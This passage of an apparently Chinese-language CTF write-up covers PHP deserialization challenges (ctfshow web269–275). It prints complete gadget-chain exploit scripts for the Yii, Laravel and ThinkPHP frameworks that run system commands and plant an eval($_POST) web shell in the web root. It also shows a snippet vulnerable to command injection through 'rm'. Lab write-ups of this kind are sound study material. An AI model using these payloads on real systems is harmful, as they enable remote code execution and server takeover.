class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-03 21:55:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-04 01:25:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &#x27;<span class="title class_">echo</span> &quot;&lt;?<span class="title class_">php</span> <span class="title class_">eval</span>(\$<span class="title class_">_POST</span>[1]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span><span class="string">&quot; &gt;/var/www/html/basic/web/1.php&#x27;);</span></span><br><span class="line"><span class="string">    echo(base64_encode(serialize(<span class="subst">$exp</span>)));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230107214350377.png" alt="image-20230107214350377"></p><p>然后去访问1.php进行rce。</p><p><img src="../images/image-20230107214429533.png" alt="image-20230107214429533"></p><p><img src="../images/image-20230107214527415.png" alt="image-20230107214527415"></p><p><strong>(下次遇到yii的题目的话，直接拿这个paylaod来打就行了)</strong></p><p>和web268一样。</p><h2 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h2><p>源码</p><p>和web268一模一样。</p><h2 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h2><p>源码</p><p><img src="../images/image-20230107232547459.png" alt="image-20230107232547459"></p><p>这是一个Laravel的php框架，我们直接上网找链子打就行了。</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-05 22:14:15</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-05 22:21:46</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">PendingCommand</span>&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">command</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$command</span>, <span class="variable">$parameters</span>,<span class="variable">$class</span>,<span class="variable">$app</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test=<span class="variable">$class</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;app=<span class="variable">$app</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">GenericUser</span>&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">attributes</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$attributes</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;attributes = <span class="variable">$attributes</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>&#123;</span><br><span class="line"><span class="title class_">class</span> <span class="title class_">Application</span>&#123;</span><br><span class="line"><span class="title class_">protected</span> $<span class="title class_">hasBeenBootstrapped</span> = <span class="title class_">false</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$bindings</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$bind</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;bindings=<span class="variable">$bind</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"><span class="title class_">echo</span> <span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span>\<span class="title class_">PendingCommand</span>(&quot;<span class="title class_">system</span>&quot;,<span class="title class_">array</span>(&#x27;<span class="title class_">tac</span> /<span class="title class_">flag</span>&#x27;),<span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Auth</span>\<span class="title class_">GenericUser</span>(<span class="title class_">array</span>(&quot;<span class="title class_">expectedOutput</span>&quot;=&gt;<span class="title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;),&quot;<span class="title class_">expectedQuestions</span>&quot;=&gt;<span class="title class_">array</span>(&quot;0&quot;=&gt;&quot;1&quot;))),<span class="title class_">new</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Application</span>(<span class="title class_">array</span>(&quot;<span class="title class_">Illuminate</span>\<span class="title class_">Contracts</span>\<span class="title class_">Console</span>\<span class="title class_">Kernel</span>&quot;=&gt;<span class="title class_">array</span>(&quot;<span class="title class_">concrete</span>&quot;=&gt;&quot;<span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Application</span>&quot;))))));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>到时候可以只在脚本里修改执行的命令就行了。</p><h2 id="web272"><a href="#web272" class="headerlink" title="web272"></a>web272</h2><p>源码</p><p>和上一题一样，都是Laravel框架</p><p>上题的paylaod用不了了</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-05 22:27:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-05 22:39:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Line</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">line</span> = <span class="title class_">new</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>\<span class="title class_">Line</span>();</span><br><span class="line">    <span class="variable">$mockdefinition</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockDefinition</span>(<span class="variable">$line</span>,<span class="string">&quot;&lt;?php file_put_contents(&#x27;/app/public/1.php&#x27;,&#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;);&quot;</span>);</span><br><span class="line">    <span class="variable">$evalloader</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Loader\EvalLoader</span>();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Bus\Dispatcher</span>(<span class="keyword">array</span>(<span class="variable">$evalloader</span>,<span class="string">&#x27;load&#x27;</span>));</span><br><span class="line">    <span class="variable">$queuedcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Console\QueuedCommand</span>(<span class="variable">$mockdefinition</span>);</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$dispatcher</span>,<span class="variable">$queuedcommand</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面为啥知道当前目录是/app/public/,可以用外带的方法，这里不用danlog了，用cookie.</p><p><img src="../images/image-20230107233821691.png" alt="image-20230107233821691"></p><p>修改一下这里，setcookie第一个参数是cookie的名字2，第二个参数是内容。</p><p><img src="../images/image-20230107234002112.png" alt="image-20230107234002112"></p><p>解码出来是<code>/app/public</code>，那么就可以往这个路径里边进行写码了。</p><p>上面的exp直接用就行了。</p><p><strong>这里加一个为什么要在木马里加转义字符的原因</strong></p><p><img src="../images/image-20230107234959347.png" alt="image-20230107234959347"></p><p><code>\$</code>表示的是$这个是有特殊用途的，不是简单的表示钱的意思。因为是在字符串里写的，识别不了，所以得加个转义字符<code>\</code></p><h2 id="web273"><a href="#web273" class="headerlink" title="web273"></a>web273</h2><p>源码</p><p>又是一道Laravel框架的题</p><p>用上一题的链子就可以了。</p><p>laravel用到的版本分别是  5.7和5.8的。</p><h2 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h2><p>源码</p><p><img src="../images/image-20230108000026004.png" alt="image-20230108000026004"></p><p>这次轮到thinkphp了。</p><p><img src="../images/image-20230108001823611.png" alt="image-20230108001823611"></p><p>发现反序列化入口，那么我们直接就上网去找payload就行了。</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//GET传参 shell</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;shell&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;shell&#x27;</span> =&gt; []];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&#x27;var_pjax&#x27;</span> =&gt; <span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&#x27;visible&#x27;</span> =&gt; [<span class="variable language_">$this</span>,<span class="string">&#x27;isPjax&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230108001955291.png" alt="image-20230108001955291"></p><p><strong>GET  shell 传参。</strong></p><h2 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h2><p>源码</p><p><strong><img src="../images/image-20230108143551463.png" alt="image-20230108143551463"></strong></p><p>这题跟反序列话没啥太大关系，就是理清逻辑关系就可以成功拿到flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>目的就是为了使evilfile为true，然后执行这个函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="comment">//写入文件内容</span></span><br><span class="line">      <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">      <span 